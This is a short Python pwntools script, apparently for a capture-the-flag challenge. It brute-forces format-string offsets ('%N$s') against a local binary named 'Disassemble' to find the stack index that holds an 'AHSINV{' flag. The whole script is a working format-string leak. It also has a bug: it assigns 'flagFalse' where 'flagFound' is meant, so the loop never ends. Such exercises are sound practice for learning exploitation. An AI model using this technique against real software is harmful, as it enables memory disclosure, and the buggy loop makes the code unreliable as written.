import sys
from pwn import *

stackIndex = None
count = 0
flagFound = False

context.binary = binary = ELF("./Disassemble")

while not flagFound:
    format_s = b"".join([b"%" + str(count).encode("utf-8") + b"$s"])
    p = process()
    p.recvuntil(b"first: ")
    p.sendline(format_s)
    output = p.recvall().decode("latin-1")
    print(output)
    print(count)
    if "AHSINV{" in output:
        flagFalse = True
    count += 1

print(f"The flag is on this stack index: {count}")
